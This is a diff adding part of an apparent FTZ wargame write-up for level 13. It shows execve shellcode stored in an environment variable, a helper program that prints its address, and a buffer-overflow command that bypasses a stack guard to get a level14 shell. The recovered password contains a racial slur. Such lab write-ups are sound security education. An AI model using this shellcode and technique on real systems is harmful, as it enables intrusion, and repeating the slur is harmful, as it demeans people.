@@ -210,3 +210,31 @@ In first run debug, I input AAAAAAAA(4141414141414141, 8bytes) and could see the
 In second run debug, I input Ax1048 (which can be overflow) and colud see that there is no canary and the result of buffer overflow.
 
 As a result of the debug, the attackme in this level has a stack guard and I will exploit with by-pass stack guard.
+
+```
+[level13@ftz tmp]$ export EGG=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+
+[level13@ftz tmp]$ cat getegg
+#include <stdlib.h>
+
+main() {
+        printf("EGG : %p", getenv("EGG"));
+}
+[level13@ftz tmp]$ gcc getegg.c -o getegg
+[level13@ftz tmp]$ ./getegg
+EGG : 0xbffffc8e
+```
+
+I made the env variable of EGG(shell code) and then made getegg(to get EGG's address)
+
+```
+[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\x8e\xfc\xff\xbf"'`
+
+sh-2.05b$ id
+uid=3094(level14) gid=3093(level13) groups=3093(level13)
+
+sh-2.05b$ my-pass
+TERM environment variable not set.
+
+Level14 Password is "what that nigga want?".
+```
